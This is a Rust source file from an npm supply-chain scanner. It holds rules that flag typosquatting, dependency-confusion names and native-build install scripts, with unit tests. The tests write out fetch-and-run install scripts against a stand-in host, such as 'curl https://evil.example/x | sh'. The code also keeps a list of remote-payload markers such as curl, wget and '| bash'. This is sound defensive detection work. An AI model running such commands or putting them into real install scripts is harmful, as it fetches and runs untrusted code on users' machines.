//! Name-based rules: typosquatting, dependency confusion, native-build pattern.

use crate::{PackageContext, RuleSession};
use anyhow::Result;
use argus_core::{Ecosystem, Finding, Severity};

/// Substrings that strongly suggest an unscoped, internal-looking package name.
pub const INTERNAL_HINTS: &[&str] = &["internal", "corp", "company", "private", "intranet"];

pub fn run(ctx: &PackageContext, rules: &RuleSession, findings: &mut Vec<Finding>) -> Result<()> {
    let name = match ctx.package.name.as_deref() {
        Some(n) if !n.is_empty() => n,
        _ => return Ok(()),
    };

    let initial_len = findings.len();
    rules.push_typosquat_findings(Ecosystem::Npm, name, "name", findings)?;
    for finding in &mut findings[initial_len..] {
        finding.location = Some("package.json".to_string());
    }

    // dependency-confusion: unscoped, internal-looking name on a public-registry
    // package. The `99.99.99` version pattern is a known attacker tactic, but
    // even without it the internal substring is enough signal to block.
    if is_dep_confusion(name) {
        findings.push(
            Finding::new(
                "dependency-confusion",
                Severity::High,
                format!("unscoped name `{name}` looks like an internal-only package"),
            )
            .at("package.json"),
        );
        findings.push(
            Finding::new(
                "public-registry-internal-name",
                Severity::High,
                "an internal-looking name resolved from the public registry would be a dependency-confusion hit",
            )
            .at("package.json"),
        );
    }

    // known-native-build-pattern, shape 1: optionalDependencies keyed by
    // `@<scope>/<platform>-<arch>` — prebuilt binaries fanned out per target
    // (esbuild/sharp style).
    if has_platform_optdeps(ctx) {
        findings.push(
            Finding::new(
                "known-native-build-pattern",
                Severity::Info,
                "optionalDependencies declare platform-arch native builds (esbuild/sharp-style)",
            )
            .at("package.json"),
        );
    } else if let Some(tool) = local_native_build_tool(ctx) {
        // Shape 2: the addon is compiled locally from bundled sources
        // (GH-185). Recognizing only prebuilt fan-out blocked every ordinary
        // node-gyp package, since its lone High `lifecycle-script` had no
        // downgrade path.
        findings.push(
            Finding::new(
                "known-native-build-pattern",
                Severity::Info,
                format!(
                    "install script builds a native addon locally via `{tool}` with no remote payload"
                ),
            )
            .at("package.json"),
        );
    }
    Ok(())
}

fn is_dep_confusion(name: &str) -> bool {
    if name.starts_with('@') {
        return false; // scoped names are not the dep-confusion shape we care about
    }
    let lower = name.to_ascii_lowercase();
    INTERNAL_HINTS.iter().any(|hint| lower.contains(hint))
}

/// Build tools that compile an addon from sources shipped inside the package.
///
/// `prebuild-install` and `node-pre-gyp` fetch a prebuilt binary first and
/// fall back to compiling, so they are not on this list: their remote fetch is
/// exactly the surface the download rules exist to inspect.
const LOCAL_NATIVE_BUILD_TOOLS: &[&str] = &["node-gyp", "cmake-js", "prebuildify", "neon"];

/// Tools that fetch a prebuilt binary before falling back to compiling.
///
/// Their remote fetch is exactly the surface the download rules exist to
/// inspect, so their presence disqualifies the downgrade even when a local
/// build tool also appears — `prebuild-install || node-gyp rebuild` still
/// reaches the network on the common path.
const REMOTE_PREBUILT_FETCHERS: &[&str] =
    &["prebuild-install", "node-pre-gyp", "prebuild-download"];

/// Markers that make a lifecycle script more than a local compile.
///
/// Any of these anywhere in the package's scripts disqualifies the downgrade:
/// `node-gyp rebuild && curl https://evil.example | sh` must stay a block.
const REMOTE_PAYLOAD_MARKERS: &[&str] = &[
    "curl", "wget", "http://", "https://", "fetch(", "| sh", "|sh", "| bash", "|bash", "iwr", "irm",
];

/// The local build tool an install script invokes, when the package's scripts
/// do nothing but compile bundled sources.
///
/// This is deliberately whole-package: a clean `install` script does not earn
/// a downgrade if `postinstall` downloads a payload.
fn local_native_build_tool(ctx: &PackageContext) -> Option<&'static str> {
    if ctx.package.scripts.is_empty() {
        return None;
    }
    let all_scripts: String = ctx
        .package
        .scripts
        .values()
        .map(|body| body.to_ascii_lowercase())
        .collect::<Vec<_>>()
        .join("\n");
    if REMOTE_PAYLOAD_MARKERS
        .iter()
        .chain(REMOTE_PREBUILT_FETCHERS.iter())
        .any(|marker| all_scripts.contains(marker))
    {
        return None;
    }
    LOCAL_NATIVE_BUILD_TOOLS
        .iter()
        .find(|tool| all_scripts.contains(*tool))
        .copied()
}

fn has_platform_optdeps(ctx: &PackageContext) -> bool {
    let platform_tokens = ["darwin", "linux", "win32", "freebsd", "netbsd", "openbsd"];
    let arch_tokens = ["arm64", "x64", "x86", "ia32", "arm"];

    ctx.package.optional_dependencies.keys().any(|k| {
        let lower = k.to_ascii_lowercase();
        platform_tokens.iter().any(|p| lower.contains(p))
            && arch_tokens.iter().any(|a| lower.contains(a))
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn internal_unscoped_name_is_dep_confusion() {
        assert!(is_dep_confusion("internal-auth-client"));
        assert!(!is_dep_confusion("@acme/internal-auth-client"));
        assert!(!is_dep_confusion("react"));
    }

    fn ctx_with_scripts(pairs: &[(&str, &str)]) -> PackageContext {
        PackageContext {
            root: std::path::PathBuf::from("/tmp/pkg"),
            package: crate::PackageJson {
                name: Some("demo".to_string()),
                version: Some("1.0.0".to_string()),
                scripts: pairs
                    .iter()
                    .map(|(key, value)| (key.to_string(), value.to_string()))
                    .collect(),
                optional_dependencies: Default::default(),
            },
            text_files: Vec::new(),
            binary_files: Vec::new(),
        }
    }

    #[test]
    fn node_gyp_install_is_a_local_native_build() {
        let ctx = ctx_with_scripts(&[("install", "node-gyp rebuild")]);
        assert_eq!(local_native_build_tool(&ctx), Some("node-gyp"));
    }

    #[test]
    fn other_local_build_tools_are_recognized() {
        for (tool, script) in [
            ("cmake-js", "cmake-js compile"),
            ("prebuildify", "prebuildify --napi"),
            ("neon", "neon build --release"),
        ] {
            let ctx = ctx_with_scripts(&[("install", script)]);
            assert_eq!(
                local_native_build_tool(&ctx),
                Some(tool),
                "script: {script}"
            );
        }
    }

    #[test]
    fn a_remote_payload_anywhere_in_scripts_blocks_the_downgrade() {
        // The whole point of the guard: compiling bundled sources is benign,
        // fetching and running something is not, and combining them must not
        // launder the second past the first.
        for scripts in [
            vec![(
                "install",
                "node-gyp rebuild && curl https://evil.example/x | sh",
            )],
            vec![
                ("install", "node-gyp rebuild"),
                ("postinstall", "curl -s https://evil.example/x | bash"),
            ],
            vec![
                ("install", "node-gyp rebuild"),
                ("preinstall", "wget https://evil.example/p"),
            ],
            vec![
                ("install", "node-gyp rebuild"),
                ("postinstall", "node -e \"fetch('https://evil.example')\""),
            ],
        ] {
            let ctx = ctx_with_scripts(&scripts);
            assert_eq!(
                local_native_build_tool(&ctx),
                None,
                "downgrade must not apply to {scripts:?}"
            );
        }
    }

    #[test]
    fn prebuilt_fetchers_are_not_treated_as_local_builds() {
        // `prebuild-install` and `node-pre-gyp` fetch a binary before falling
        // back to compiling. That fetch is the surface the download rules
        // exist to inspect, so it must not be downgraded here.
        for script in [
            "prebuild-install || node-gyp rebuild",
            "node-pre-gyp install",
        ] {
            let ctx = ctx_with_scripts(&[("install", script)]);
            assert_eq!(local_native_build_tool(&ctx), None, "script: {script}");
        }
    }

    #[test]
    fn ordinary_scripts_are_not_native_builds() {
        assert_eq!(
            local_native_build_tool(&ctx_with_scripts(&[("test", "jest")])),
            None
        );
        assert_eq!(local_native_build_tool(&ctx_with_scripts(&[])), None);
    }

    #[test]
    fn a_node_gyp_package_emits_the_downgrade_marker() {
        let ctx = ctx_with_scripts(&[("install", "node-gyp rebuild")]);
        let rules = RuleSession::builtin().expect("builtin rules");
        let mut findings = Vec::new();
        run(&ctx, &rules, &mut findings).expect("name rules run");
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == "known-native-build-pattern"),
            "got: {findings:?}"
        );
    }

    #[test]
    fn a_node_gyp_package_that_also_downloads_emits_no_marker() {
        let ctx = ctx_with_scripts(&[(
            "install",
            "node-gyp rebuild && curl https://evil.example | sh",
        )]);
        let rules = RuleSession::builtin().expect("builtin rules");
        let mut findings = Vec::new();
        run(&ctx, &rules, &mut findings).expect("name rules run");
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == "known-native-build-pattern"),
            "got: {findings:?}"
        );
    }
}
